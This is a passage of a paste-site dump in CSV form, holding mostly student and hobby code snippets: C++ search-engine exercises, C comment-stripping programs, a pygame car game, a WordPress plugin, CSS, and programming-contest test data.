                        help='If you have credentials of the application user, type admanager. If you have credentials of the domain user, type domain DNS name of the target domain.')
    parser.add_argument('-u', '--user', required=True, action='store')
    parser.add_argument('-p', '--password', required=True, action='store')
    args = parser.parse_args()
    return args


main()
            "
pb6SvBjD,Untitled,Farz0l1x,Python,Tuesday 13th of February 2024 08:43:46 AM CDT,"A = []
for n in range(1000):
    b = bin(n)[2:]
    if int(b) % 3 == 0:
        while '0' in b:
            b = b.replace('0', '11')
    else:
        for i in range(len(b)):
            if int(b[i]) == 1:
                b = b.replace(b[i], '10')
    R = int(b, 2)
    if R <= 161:
        A.append(R)
print(max(A))"
Wy0YeVYM,Untitled,x7f,JavaScript,Tuesday 13th of February 2024 08:39:21 AM CDT,"const totallyNormalMethod = node => {
  const config = { childList: true, subtree: true };
  
  const callback = (mutationList, observer) => {
    const s = node.querySelector('[role=""listbox""]>*>*');
    s?.children && [...s.children].forEach(e=>parseInt(e.textContent)>2024 && e.remove())
  };

  const observer = new MutationObserver(callback);
  
  observer.observe(node, config);
}

///////

getRootRef={totallyNormalMethod}"
h4vhb7Js,gameNumberWars,zarkoto223,JavaScript,Tuesday 13th of February 2024 07:56:34 AM CDT,"function wars(input) {

    let playerOne = input[0];
    let playerTwo = input[1];

    let onePlScore = 0;
    let twoPlScore = 0

    for (let i = 2; i < input.length; i += 2) {

        if (input[i] === 'End of game') {
            console.log(`${playerOne} has ${onePlScore} points`)
            console.log(`${playerTwo} has ${twoPlScore} points`)
            return
        }

        let oneCard = Number(input[i])
        let twoCard = Number(input[i + 1])


        if (oneCard > twoCard) {
            onePlScore += oneCard - twoCard
        } else if (twoCard > oneCard) {
            twoPlScore += twoCard - oneCard
        } else {
            console.log(""Number wars!"");
            break;
        }
    }
    if (onePlScore > twoPlScore) {
        console.log(`${playerOne} is winner with ${onePlScore} points`)

    } else {
        console.log(`${playerTwo} is winner with ${twoPlScore} points`)
    }
}

wars([
    'Desi',
    'Niki',
    '7',
    '5',
    '3',
    '4',
    '3',
    '3',
    '5',
    '3'


])


// wars(['Aleks',
// 'Georgi',
// '4',
// '5',
// '3',
// '2',
// '4',
// '3',
// '4',
// '4',
// '5',
// '2'
//     ])"
c0AtV97R,Remove comment and remove space,zaifmahi,C++,Tuesday 13th of February 2024 07:36:57 AM CDT,"#include <stdio.h>
#include<string.h>
int main() {
    FILE *inputFile = fopen(""inp.txt"", ""r"");
    FILE *outputFile = fopen(""out.txt"", ""w"");
    if (inputFile == NULL || outputFile == NULL) {
        printf(""Unable to open the file.\n"");
        return 1;
    }
 
    char currentChar, nextChar;
    while ((currentChar = fgetc(inputFile)) != EOF) {
        if (currentChar == '/') {
            nextChar = fgetc(inputFile);
            if (nextChar == '/') {
                // Ignore the rest of the line
                while ((currentChar = fgetc(inputFile)) != '\n' && currentChar != EOF);
            }
            else if (nextChar == '*') {
                // Ignore until the closing */
                while (!((currentChar = fgetc(inputFile)) == '*' && (nextChar = fgetc(inputFile)) == '/')) {
                    if (currentChar == EOF) {
                        printf(""Error: Unclosed multi-line comment.\n"");
                        return 1;
                    }
                }
            }
            else {
                fputc(currentChar, outputFile);
                fputc(nextChar, outputFile);
            }
        }
        else {
            fputc(currentChar, outputFile);
        }
    }
    fclose(inputFile);
    fclose(outputFile);
    FILE* file = fopen(""out.txt"", ""r"");
    FILE* file1 = fopen(""combined.txt"", ""w"");
 
    char line[256];
        char line1[256];
 
    while (fgets(line, sizeof(line), file)) {
                if(strlen(line) > 1){
                fputs(line, file1);
        }
    }
    fclose(file);
        fclose(file1);
        FILE* file2 = fopen(""combined.txt"", ""r"");

    while(fgets(line1, sizeof(line1), file2)){
                printf(""%s"", line1);
    }
    printf(""\n"");
    fclose(file2);
    return 0;
}

"
tRn9dv8k,Remove Space from text file,zaifmahi,C++,Tuesday 13th of February 2024 07:35:31 AM CDT,"#include <stdio.h>
#include<string.h>
int main() {
    FILE *inputFile = fopen(""out.txt"", ""r"");
    FILE *outputFile = fopen(""space_out.txt"", ""w"");
    if (inputFile == NULL || outputFile == NULL) {
        printf(""Unable to open the file.\n"");
        return 1;
    }

 
    char line[256];
    char line1[256];
 
    while (fgets(line, sizeof(line), inputFile)) {
        if (strlen(line) > 1){
                        fputs(line, outputFile);
        }
    }
    
        fclose(inputFile);
        fclose(outputFile);

        FILE *file = fopen(""space_out.txt"", ""r"");

    while (fgets(line1, sizeof(line1), file)){
                printf(""%s"", line1);
    }
    fclose(file);
    return 0;
}
"
WXPThAr8,Remove C style comment 1,zaifmahi,C++,Tuesday 13th of February 2024 07:34:01 AM CDT,"#include <stdio.h>
#include<string.h>
int main() {
    FILE *inputFile = fopen(""inp.txt"", ""r"");
    FILE *outputFile = fopen(""out.txt"", ""w"");
    if (inputFile == NULL || outputFile == NULL) {
        printf(""Unable to open the file.\n"");
        return 1;
    }
 
    char currentChar, nextChar;
    while ((currentChar = fgetc(inputFile)) != EOF) {
        if (currentChar == '/') {
            nextChar = fgetc(inputFile);
            if (nextChar == '/') {
                // Ignore the rest of the line
                while ((currentChar = fgetc(inputFile)) != '\n' && currentChar != EOF);
            }
            else if (nextChar == '*') {
                // Ignore until the closing */
                while (!((currentChar = fgetc(inputFile)) == '*' && (nextChar = fgetc(inputFile)) == '/')) {
                    if (currentChar == EOF) {
                        printf(""Error: Unclosed multi-line comment.\n"");
                        return 1;
                    }
                }
            }
            else {
                fputc(currentChar, outputFile);
                fputc(nextChar, outputFile);
            }
        }
        else {
            fputc(currentChar, outputFile);
        }
    }
    fclose(inputFile);
    fclose(outputFile);
    FILE* file = fopen(""out.txt"", ""r"");
 
    char line[256];
 
    while (fgets(line, sizeof(line), file)) {
        printf(""%s"", line);
    }
    fclose(file);
    return 0;
}
"
mPzZcZRc,Untitled,madhu_fresh,C++,Tuesday 13th of February 2024 07:15:03 AM CDT,"#include <algorithm>
#include <cmath>
#include <iostream>
#include <map>
#include <set>
#include <string>
#include <utility>
#include <vector>

using namespace std;

const int MAX_RESULT_DOCUMENT_COUNT = 5;

string ReadLine() {
    string s;
    getline(cin, s);
    return s;
}

int ReadLineWithNumber() {
    int result;
    cin >> result;
    ReadLine();
    return result;
}

vector<string> SplitIntoWords(const string& text) {
    vector<string> words;
    string word;
    for (const char c : text) {
        if (c == ' ') {
            if (!word.empty()) {
                words.push_back(word);
                word.clear();
            }
        }
        else {
            word += c;
        }
    }
    if (!word.empty()) {
        words.push_back(word);
    }

    return words;
}

struct Document {
    int id;
    double relevance;
    int rating;
};

enum class DocumentStatus {
    ACTUAL,
    IRRELEVANT,
    BANNED,
    REMOVED,
};

class SearchServer {
public:

    int GetDocumentCount() {
        return static_cast<int>(documents_.size());
    }

    tuple<vector<string>, DocumentStatus> MatchDocument(const string& raw_query, int document_id) const {

        vector<string> answer;

        auto data = ParseQuery(raw_query);

        for (string plus_word : data.plus_words)
        {
            
			if (word_to_document_freqs_.at(plus_word).count(document_id) != 0 &&
                word_to_document_freqs_.at(plus_word).at(document_id) > 0)
            {
                answer.push_back(plus_word);
            }

        }


        for (string minus_word : data.minus_words)
        {
            if (word_to_document_freqs_.at(minus_word).count(document_id) != 0 &&
                word_to_document_freqs_.at(minus_word).at(document_id) > 0)
            {
                return {};
            }
        }

        return tuple(answer, documents_.at(document_id).status);

    }

    void SetStopWords(const string& text) {
        for (const string& word : SplitIntoWords(text)) {
            stop_words_.insert(word);
        }
    }

    void AddDocument(int document_id, const string& document, DocumentStatus status,
        const vector<int>& ratings) {
        const vector<string> words = SplitIntoWordsNoStop(document);
        const double inv_word_count = 1.0 / words.size();
        for (const string& word : words) {
            word_to_document_freqs_[word][document_id] += inv_word_count;
        }
        documents_.emplace(document_id, DocumentData{ ComputeAverageRating(ratings), status });
    }

    vector<Document> FindTopDocuments(const string& raw_query,
        DocumentStatus status = DocumentStatus::ACTUAL) const {
        const Query query = ParseQuery(raw_query);
        auto matched_documents = FindAllDocuments(query, status);

        sort(matched_documents.begin(), matched_documents.end(),
            [](const Document& lhs, const Document& rhs) {
                return lhs.relevance > rhs.relevance;
            });
        if (matched_documents.size() > MAX_RESULT_DOCUMENT_COUNT) {
            matched_documents.resize(MAX_RESULT_DOCUMENT_COUNT);
        }
        return matched_documents;
    }

private:
    struct DocumentData {
        int rating;
        DocumentStatus status;
    };

    set<string> stop_words_;
    map<string, map<int, double>> word_to_document_freqs_;
    map<int, DocumentData> documents_;

    bool IsStopWord(const string& word) const {
        return stop_words_.count(word) > 0;
    }

    vector<string> SplitIntoWordsNoStop(const string& text) const {
        vector<string> words;
        for (const string& word : SplitIntoWords(text)) {
            if (!IsStopWord(word)) {
                words.push_back(word);
            }
        }
        return words;
    }

    static int ComputeAverageRating(const vector<int>& ratings) {
        if (ratings.empty()) {
            return 0;
        }
        int rating_sum = 0;
        for (const int rating : ratings) {
            rating_sum += rating;
        }
        return rating_sum / static_cast<int>(ratings.size());
    }

    struct QueryWord {
        string data;
        bool is_minus;
        bool is_stop;
    };

    QueryWord ParseQueryWord(string text) const {
        bool is_minus = false;
        // Word shouldn't be empty
        if (text[0] == '-') {
            is_minus = true;
            text = text.substr(1);
        }
        return { text, is_minus, IsStopWord(text) };
    }

    struct Query {
        set<string> plus_words;
        set<string> minus_words;
    };

    Query ParseQuery(const string& text) const {
        Query query;
        for (const string& word : SplitIntoWords(text)) {
            const QueryWord query_word = ParseQueryWord(word);
            if (!query_word.is_stop) {
                if (query_word.is_minus) {
                    query.minus_words.insert(query_word.data);
                }
                else {
                    query.plus_words.insert(query_word.data);
                }
            }
        }
        return query;
    }

    // Existence required
    double ComputeWordInverseDocumentFreq(const string& word) const {
        return log(documents_.size() * 1.0 / word_to_document_freqs_.at(word).size());
    }

    vector<Document> FindAllDocuments(const Query& query, DocumentStatus status) const {
        map<int, double> document_to_relevance;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            const double inverse_document_freq = ComputeWordInverseDocumentFreq(word);
            for (const auto& [document_id, term_freq] : word_to_document_freqs_.at(word)) {
                if (documents_.at(document_id).status == status) {
                    document_to_relevance[document_id] += term_freq * inverse_document_freq;
                }
            }
        }

        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            for (const auto& [document_id, _] : word_to_document_freqs_.at(word)) {
                document_to_relevance.erase(document_id);
            }
        }

        vector<Document> matched_documents;
        for (const auto& [document_id, relevance] : document_to_relevance) {
            matched_documents.push_back(
                { document_id, relevance, documents_.at(document_id).rating });
        }
        return matched_documents;
    }
};

void PrintMatchDocumentResult(int document_id, const vector<string>& words, DocumentStatus status) {
    cout << ""{ ""s
        << ""document_id = ""s << document_id << "", ""s
        << ""status = ""s << static_cast<int>(status) << "", ""s
        << ""words =""s;
    for (const string& word : words) {
        cout << ' ' << word;
    }
    cout << ""}""s << endl;
}
int main() {
    setlocale(LC_ALL, ""RU"");
    SearchServer search_server;

    search_server.SetStopWords(""и в на"");

    search_server.AddDocument(0, ""белый кот и модный ошейник"", DocumentStatus::ACTUAL, { 1 });
    search_server.AddDocument(1, ""пушистый кот пушистый хвост"", DocumentStatus::ACTUAL, { 2 });
    search_server.AddDocument(2, ""ухоженный пёс выразительные глаза"", DocumentStatus::ACTUAL,
        { 3 });


    const std::string query = ""пушистый ухоженный кот -ошейник"";

    std::cout << ""Documents' statuses:""s << std::endl;
    const int document_count = search_server.GetDocumentCount();
    for (int document_id = 0; document_id < document_count; ++document_id) {
        const auto [words, status] = search_server.MatchDocument(query, document_id);
        cout << ""id = ""s << document_id << "", words =""s;
        for (const std::string& word : words) {
            std::cout << ' ' << word;
        }
        cout << endl;
    }
}"
0HhN4X35,mainn,sriyanto,Python,Tuesday 13th of February 2024 07:03:41 AM CDT,"# Main game loop
running = True
while running:
    screen.fill(WHITE)

    # Event handling
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    # Player control
    keys = pygame.key.get_pressed()
    if keys[pygame.K_LEFT]:
        car_x -= car_speed
    if keys[pygame.K_RIGHT]:
        car_x += car_speed

    # Boundary checking for player car
    if car_x < 0:
        car_x = 0
    elif car_x > WIDTH - car_width:
        car_x = WIDTH - car_width

    # Generate obstacles
    if random.randrange(0, 100) < obstacle_frequency:
        obstacle_x = random.randrange(0, WIDTH - obstacle_width)
        obstacle_y = -obstacle_height
        obstacles.append([obstacle_x, obstacle_y])

    # Generate coins
    if random.randrange(0, 100) < coin_frequency:
        coin_x = random.randrange(0, WIDTH - coin_width)
        coin_y = -coin_height
        coins.append([coin_x, coin_y])

    # Move obstacles and coins
    for obstacle in obstacles:
        obstacle[1] += obstacle_speed
        screen.blit(obstacle_img, (obstacle[0], obstacle[1]))
        if obstacle[1] > HEIGHT:
            obstacles.remove(obstacle)
            score -= 10

    for coin in coins:
        coin[1] += obstacle_speed
        screen.blit(coin_img, (coin[0], coin[1]))
        if coin[1] > HEIGHT:
            coins.remove(coin)

    # Collision detection
    car_rect = pygame.Rect(car_x, car_y, car_width, car_height)
    for obstacle in obstacles:
        obstacle_rect = pygame.Rect(obstacle[0], obstacle[1], obstacle_width, obstacle_height)
        if car_rect.colliderect(obstacle_rect):
            obstacles.remove(obstacle)
            score -= 50

    for coin in coins:
        coin_rect = pygame.Rect(coin[0], coin[1], coin_width, coin_height)
        if car_rect.colliderect(coin_rect):
            coins.remove(coin)
            score += 10

    # Display score
    display_text(""Score: "" + str(score), BLACK, 10, 10)

    # Draw player car
    screen.blit(car_img, (car_x, car_y))

    pygame.display.flip()
    clock.tick(60)

pygame.quit()
"
8ZSBQZDb,Genesis - limit category archive description to first page,daymobrew,PHP,Tuesday 13th of February 2024 07:00:36 AM CDT,"<?php
/*
Plugin Name: Genesis - limit category archive description to first page
Description: Limit the category archive description to the first archive page.
Plugin URI: https://www.damiencarbery.com/
Version: 0.1
Author: Damien Carbery
*/

defined( 'ABSPATH' ) || exit;


add_action( 'genesis_before_loop', 'check_for_archive_first_page', 5 );
function check_for_archive_first_page() {
	if ( ! is_category() ) { return; }
	if ( is_paged() ) {
		remove_action( 'genesis_before_loop', 'genesis_do_taxonomy_title_description', 15 );
	}
}
"
eXxwcRYX,23401,boyan1324,Python,Tuesday 13th of February 2024 06:32:11 AM CDT,"from math import ceil
laps = []
N = int(input())
for i in range(1, N):
    times = int(input())
    laps.append(times)
print(f""Count of laps: {len(laps)}"")
print(f""List of laps: {laps}"")
print(f""Fastest lap: {min(laps)}"")
print(f""Slowest lap: {max(laps)}"")
print(f""Total time of laps: {sum(laps)}"")
print(f""Average laps time: {ceil(laps / sum(laps))}"")

laps = []
while True:
    command = input()
    if command == ""stop"":
        break
    laps.append(int(command))
print(f""Count of Monza lap: {len(laps)}"")
print(f""List of laps: {laps}"")
print(f""Fastest lap: {min(laps)}"")
print(f""SLowest lap: {max(laps)}"")
print(f""Total laps time: {sum(laps)/60}:{sum(laps)}"")
print(f""Average lap time: {((len(laps) / sum(laps))/60):02d}:{(len(laps) % 60):02d}"")
"
C2N33t5c,Untitled,s-sols,CSS,Tuesday 13th of February 2024 06:24:36 AM CDT,"body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__wrapper {
	width: 100% !important;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__wrapper > div:first-of-type {
	margin-bottom: 7px;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__wrapper > div:nth-of-type(1n + 2) {
	float: left !important;
	width: 22% !important;
	margin-right: 4% !important;
	margin-bottom: 15px !important;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__wrapper > div:nth-of-type(1n + 2) img {
	width: 100px !important;
	height: auto !important;
	aspect-ratio: 1/1 !important;
	opacity: .5 !important;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery .flex-control-thumbs {
	display: none;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery .flex-viewport {
	height: auto !important;
	margin-bottom: 0 !important;
}
"
LLp5fwKj,data839,TestGuy1,JSON,Tuesday 13th of February 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '21e0e8b04ecf4a8cd0e82fbfb4890478421add5ed0378222f65189b48c02eb9922b7ac8caed50e477611d004e369cd0620d3f684bfd840850183f145e52f05b58a449907c4a3133ec39380b6775671c1dfddf3a419c6546ff5e19bdd99278a1dc43064d86eec50d231189cf1a755e61af4bbb41490a5a0e999f98461a23707d8',
  otherdata: [
    '1b62fe75a8b9798013f4f8c44dcb84be',
    'c41630db49298cb14d1d5d2bffb20bcc',
    '14ae73a3ee1e5c77c0f120a4b2b843c0',
    'fcc2df5a8532d64eace60cdcef2effea',
    '82c4e38d0018b927a23996e85cc68e02',
    '8c315b269a93ab11933b5d48eea467bb',
    'f3411641dafadbb3be763640e90f7505',
    'dc038387e1c7f064374f48250af02b25'
  ]
}"
KkP0fsPw,BadDomain,cepxuozab,C++,Tuesday 13th of February 2024 05:50:34 AM CDT,"10
aa.aaaa.a.a.a.aaaa.a
aa
a.aa.aaaa.a.a.a.aaaa.a
a.aa
a.aa.aaaa.aa.a.aa
aaaa.a.a.aaaa.a
aa
aaaa.a.a.a.aaaa.a
aa.aaaa.a.a.a.aaaa.a
aaaa.aa.aaa.aaaa.a
100
a.aa.aaaa.a.a.a.aaaa.a
aa.aa.aaa.aa.aaaa.aa.aaa.aaaa.a
aaa.aa.aa.aaaa.a.a.a.aaaa.a
aa
aaaa.a.a.a.aaaa.a
aa.aaaa.aaaa.aaa.aaaa.a.aa
a.aaa.aaaa.aaa.a.aa.aa.aa
aaaa.aa.aaaa.a.a.a.aaaa.a
aaaa.aaaa.aa.aa
aaaa.aaa.aa.a.aaaa.a.a.a.aaaa.a
aaaa.aaaa.a.a.a.aaaa.a
aaa.aaaa
aaa
aaaa.a.a.aaaa.a
aaa.aa.a.aa.a.aaaa.a.a.aaaa.a
a.aaa.aaaa.a.a.a.aaaa.a
aa.aa.aa.a.aa
aaa.aaa.aaaa.aaa.aa.a.aaaa.aa.aa
aa.a.aa.aaaa.aa.a.aa
a.aa.a.aa.aaaa.a.a.a.aaaa.a
aaa.a.aaa.aaaa.a.a.aaaa.a
aaaa.a.aa.aaaa.a.a.a.aaaa.a
aa.aaa.a.aa.aaaa.a.a.a.aaaa.a
a.aaaa
aa.aa.aaa.aaaa.aa.aaa.aaaa.a
aa.aaaa.a.a.a.aaaa.a
aaaa.aa.aaa.aa.aaaa.a.a.a.aaaa.a
aaaa.aaaa.a.aaaa.a.a.aaaa.a
aa.a.aaa.aaaa.aa.aaa.a.aaa.a.aa
aaa.aa.a.aaa.aaaa.a.aaaa.a
aa.a.aaa.a.a.a.aaaa.a
aaa.aaa.aa.aaaa.a.a.a.aaaa.a
a.aa.aaaa.aa.aaaa.a.a.a.aaaa.a
aaaa.a.a.a.aaaa.a
aaa.a.aa.aaaa.a.a.a.aaaa.a
aaa.aa.a.aaa.aaaa.a.a.a.aaaa.a
a.aa
aaaa.a.a.a.aaaa.a
aa.aaa.aaa.aa.aaa.a.a.a.a.aa
aa.aa.aa.aa.aaaa.aa.aaa.aaaa.a
aaaa.a.aa.aaaa.a.a.a.aaaa.a
aaaa.aaaa.a.aaaa.aaa.aaa.aaaa.aaa.aa
aaaa.a.aaa.aaa.aaaa.a.a.aa
aaaa.aa
aaaa.a.a.aa.aaaa.a.a.a.aaaa.a
a.aaaa.a.aaa.aaaa.a.a.a.aaaa.a
aa.a.aa.aaaa.a.a.a.aaaa.a
aaaa.a.aa.aaaa.a.a.a.aaaa.a
aa.aaaa.a.a.a.aaaa.a
a.a.aa.aaaa.aaaa.a.aa.a.aaaa.aa
a.a.a.aaaa.a
a.aaa.aaaa.aaaa.a.a.a.aaaa.a
aaaa.aaa.aaa.aa
aaaa.aaa.aa.aa.aaaa.a.a.a.aaaa.a
aa.aaa.aaa.aa.aaaa.a.a.a.aaaa.a
aa.a.aa.aaa.aaaa.aa.aaa.aaa
a.aaa.aaa.aaaa.a.aa.aaaa.aa.a.aa
aaa.aa.aaa.a.aa
a.aaaa.aa.a.aaaa.aaaa.a
aaa.aa.aaaa.a.a.a.aaaa.a
aa.aaa.aaaa.aaa.aa.aaa
aa.a.aaa.aa.aaaa.aaaa
aa.aaa.aa.aaaa.a.a.a.aaaa.a
aa.aa.aaaa.aaa.aa.aaaa.a.a.aaaa.a
aaaa.a.a.aa
a.aa.aaaa.a.a.a.aaaa.a
aaaa.aa.aaaa.aa.aaaa.a.a.a.aaaa.a
aaaa.aa.aaaa.aa.aaa.aaaa.a
aaaa.aaaa.aaa.a.aa
aaaa.a.a.a.aaaa.a
aaa.aaaa.aa.aaaa.a.a.a.aaaa.a
aa.aa.aa.aa.aaa.aaaa.a.aaaa.aaaa.a
a.aaa.aaaa.aaaa.a.a.a.aaaa.a
aaaa.aa.aaa.aa
aaa.aaaa.a.aaa.a.aaaa.a.a.aaaa.a
aa.a.aaaa.aaa.aa.a.aa.aaaa.aaa.aa
aaaa.a.a.aa.aaaa.aaa.aaaa.aaaa.aaaa.aa
aaaa.a.a.aaaa.a
aa.aa.aaaa.a.a.a.aaaa.a
a.a.aaa.aaa.aa
aaaa.a.a.a.aaaa.a
a.aaa.aaaa.aa.aaaa.a.a.a.aaaa.a
a.aaaa.a.aa
a.aaaa.a
aaaa.a.aaaa.aaaa.a.a.aa.aaaa
aaaa.aaa.aaaa.aa.aaa.a.a.aaaa.a
a.aaaa.aa.aa.a.aaaa.aa.aaa.aaaa.a
a.aa.aaaa.a.a.aaaa.a
aaa.aa
aaaa.a.a.aa.aaaa.a.a.a.aaaa.a
aaa.a.a
aa.aaaa.a.a.a.aaaa.a
aa.a.aa.aaaa.a.a.a.aaaa.a
aaaa.a.a.a.aaaa.a
aaa.aaaa.aaaa.aa.aa.aaa.aaa.a.aa
a.aaaa.a
aaaa.aa.aaaa.a.a.a.aaaa.a
a.aa.a.aaa.aaaa.a.aa
aaa.aa.aaaa.aaa.aaaa.a.a.aaaa.a
aa.aaaa.a.a.a.aaaa.a


Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Good
Good
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Good
Bad
Bad
Bad
Bad
Bad
Good
Good
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Good
Bad
Bad
Bad
Bad
Good
Bad
Bad
Good
Bad
Good
Good
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Good
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Bad
Good
Good
Good
Bad
Bad
Bad
Bad
Good
Bad
Bad
Bad
Bad
Good
Bad
Bad
Bad
Bad"
CnZJwL4N,Untitled,madhu_fresh,C++,Tuesday 13th of February 2024 05:50:16 AM CDT,"#include <algorithm>
#include <cmath>
#include <iostream>
#include <map>
#include <set>
#include <string>
#include <utility>
#include <vector>

using namespace std;

const int MAX_RESULT_DOCUMENT_COUNT = 5;

string ReadLine() {
    string s;
    getline(cin, s);
    return s;
}

int ReadLineWithNumber() {
    int result;
    cin >> result;
    ReadLine();
    return result;
}

vector<string> SplitIntoWords(const string& text) {
    vector<string> words;
    string word;
    for (const char c : text) {
        if (c == ' ') {
            if (!word.empty()) {
                words.push_back(word);
                word.clear();
            }
        }
        else {
            word += c;
        }
    }
    if (!word.empty()) {
        words.push_back(word);
    }

    return words;
}

struct Document {
    int id;
    double relevance;
    int rating;
};

enum class DocumentStatus {
    ACTUAL,
    IRRELEVANT,
    BANNED,
    REMOVED,
};

class SearchServer {
public:

    int GetDocumentCount() {
        return static_cast<int>(documents_.size());
    }

    tuple<vector<string>, DocumentStatus> MatchDocument(const string& raw_query, int document_id) const {

        vector<string> answer;

        auto x = ParseQuery(raw_query).plus_words;

        for (string plus_word : ParseQuery(raw_query).plus_words)
        {
            
            if (word_to_document_freqs_.at(plus_word).find(document_id) != word_to_document_freqs_.at(plus_word).end() &&
                word_to_document_freqs_.at(plus_word).at(document_id) > 0)
            {
                answer.push_back(plus_word);
            }

        }


        for (string minus_word : ParseQuery(raw_query).minus_words)
        {
            if (word_to_document_freqs_.at(minus_word).find(document_id) != word_to_document_freqs_.at(minus_word).end() &&
                word_to_document_freqs_.at(minus_word).at(document_id) > 0)
            {
                return {};
            }
        }

        return tuple(answer, documents_.at(document_id).status);

    }

    void SetStopWords(const string& text) {
        for (const string& word : SplitIntoWords(text)) {
            stop_words_.insert(word);
        }
    }

    void AddDocument(int document_id, const string& document, DocumentStatus status,
        const vector<int>& ratings) {
        const vector<string> words = SplitIntoWordsNoStop(document);
        const double inv_word_count = 1.0 / words.size();
        for (const string& word : words) {
            word_to_document_freqs_[word][document_id] += inv_word_count;
        }
        documents_.emplace(document_id, DocumentData{ ComputeAverageRating(ratings), status });
    }

    vector<Document> FindTopDocuments(const string& raw_query,
        DocumentStatus status = DocumentStatus::ACTUAL) const {
        const Query query = ParseQuery(raw_query);
        auto matched_documents = FindAllDocuments(query, status);

        sort(matched_documents.begin(), matched_documents.end(),
            [](const Document& lhs, const Document& rhs) {
                return lhs.relevance > rhs.relevance;
            });
        if (matched_documents.size() > MAX_RESULT_DOCUMENT_COUNT) {
            matched_documents.resize(MAX_RESULT_DOCUMENT_COUNT);
        }
        return matched_documents;
    }

private:
    struct DocumentData {
        int rating;
        DocumentStatus status;
    };

    set<string> stop_words_;
    map<string, map<int, double>> word_to_document_freqs_;
    map<int, DocumentData> documents_;

    bool IsStopWord(const string& word) const {
        return stop_words_.count(word) > 0;
    }

    vector<string> SplitIntoWordsNoStop(const string& text) const {
        vector<string> words;
        for (const string& word : SplitIntoWords(text)) {
            if (!IsStopWord(word)) {
                words.push_back(word);
            }
        }
        return words;
    }

    static int ComputeAverageRating(const vector<int>& ratings) {
        if (ratings.empty()) {
            return 0;
        }
        int rating_sum = 0;
        for (const int rating : ratings) {
            rating_sum += rating;
        }
        return rating_sum / static_cast<int>(ratings.size());
    }

    struct QueryWord {
        string data;
        bool is_minus;
        bool is_stop;
    };

    QueryWord ParseQueryWord(string text) const {
        bool is_minus = false;
        // Word shouldn't be empty
        if (text[0] == '-') {
            is_minus = true;
            text = text.substr(1);
        }
        return { text, is_minus, IsStopWord(text) };
    }

    struct Query {
        set<string> plus_words;
        set<string> minus_words;
    };

    Query ParseQuery(const string& text) const {
        Query query;
        for (const string& word : SplitIntoWords(text)) {
            const QueryWord query_word = ParseQueryWord(word);
            if (!query_word.is_stop) {
                if (query_word.is_minus) {
                    query.minus_words.insert(query_word.data);
                }
                else {
                    query.plus_words.insert(query_word.data);
                }
            }
        }
        return query;
    }

    // Existence required
    double ComputeWordInverseDocumentFreq(const string& word) const {
        return log(documents_.size() * 1.0 / word_to_document_freqs_.at(word).size());
    }

    vector<Document> FindAllDocuments(const Query& query, DocumentStatus status) const {
        map<int, double> document_to_relevance;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            const double inverse_document_freq = ComputeWordInverseDocumentFreq(word);
            for (const auto& [document_id, term_freq] : word_to_document_freqs_.at(word)) {
                if (documents_.at(document_id).status == status) {
                    document_to_relevance[document_id] += term_freq * inverse_document_freq;
                }
            }
        }

        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            for (const auto& [document_id, _] : word_to_document_freqs_.at(word)) {
                document_to_relevance.erase(document_id);
            }
        }

        vector<Document> matched_documents;
        for (const auto& [document_id, relevance] : document_to_relevance) {
            matched_documents.push_back(
                { document_id, relevance, documents_.at(document_id).rating });
        }
        return matched_documents;
    }
};

void PrintMatchDocumentResult(int document_id, const vector<string>& words, DocumentStatus status) {
    cout << ""{ ""s
        << ""document_id = ""s << document_id << "", ""s
        << ""status = ""s << static_cast<int>(status) << "", ""s
        << ""words =""s;
    for (const string& word : words) {
        cout << ' ' << word;
    }
    cout << ""}""s << endl;
}
int main() {
    setlocale(LC_ALL, ""RU"");
    SearchServer search_server;

    search_server.SetStopWords(""и в на"");

    search_server.AddDocument(0, ""белый кот и модный ошейник"", DocumentStatus::ACTUAL, { 1 });
    search_server.AddDocument(1, ""пушистый кот пушистый хвост"", DocumentStatus::ACTUAL, { 2 });
    search_server.AddDocument(2, ""ухоженный пёс выразительные глаза"", DocumentStatus::ACTUAL,
        { 3 });


    const std::string query = ""пушистый ухоженный кот -ошейник"";

    std::cout << ""Documents' statuses:""s << std::endl;
    const int document_count = search_server.GetDocumentCount();
    for (int document_id = 0; document_id < document_count; ++document_id) {
        const auto [words, status] = search_server.MatchDocument(query, document_id);
        cout << ""id = ""s << document_id << "", words =""s;
        for (const std::string& word : words) {
            std::cout << ' ' << word;
        }
        cout << endl;
    }
}"
0P0C696D,Untitled,35657,C++,Tuesday 13th of February 2024 05:37:29 AM CDT,"#include <iostream>
#include <vector>


using namespace std;

class Vector {

public:
	Vector() {
		arr_ = new int[4];
		size_ = 0;
		capacity_ = 4;
	}

	Vector(const int capacity) {
		arr_ = new int[capacity];
		size_ = 0;
		capacity_ = capacity;
	}

	void push_back(const int value) {
		check_capacity();
		arr_[size_] = value;
		size_++;
	}

	void insert(const int index, const int value) {
		if (index < 0 || index > size_) {
			cout << ""Некорректный индекс"" << endl;
			return;
		}
		check_capacity();
		for (int i = size_; i > index; i--) {
			arr_[i] = arr_[i - 1];
		}
		arr_[index] = value;
		size_++;
	}

